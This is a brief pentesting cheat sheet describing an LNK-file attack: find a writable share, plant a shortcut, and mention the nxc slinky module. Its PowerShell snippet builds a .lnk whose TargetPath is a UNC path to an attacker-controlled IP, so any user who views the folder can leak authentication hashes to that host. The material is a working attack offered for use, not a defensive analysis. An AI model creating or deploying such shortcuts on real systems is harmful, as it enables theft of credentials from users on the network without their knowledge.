# LNK File

## Attack Overview
1. Find writeable directory/share
2. Generate malicious LNK file, replacing the 'TargetPath' 
```
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\10.0.2.7\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```
3. Start

## Tools
### nxc slinky module
